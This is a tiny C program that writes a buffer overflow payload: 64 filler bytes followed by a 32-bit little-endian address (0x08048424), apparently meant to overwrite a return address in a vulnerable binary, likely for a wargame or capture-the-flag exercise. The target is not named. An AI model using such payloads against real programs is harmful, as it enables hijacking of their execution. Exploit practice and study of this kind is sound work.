#include <stdio.h>

int main(void){
    for(int i=0; i<64; i++){
        printf("a");
    }
    printf("\x24\x84\x04\x08");
}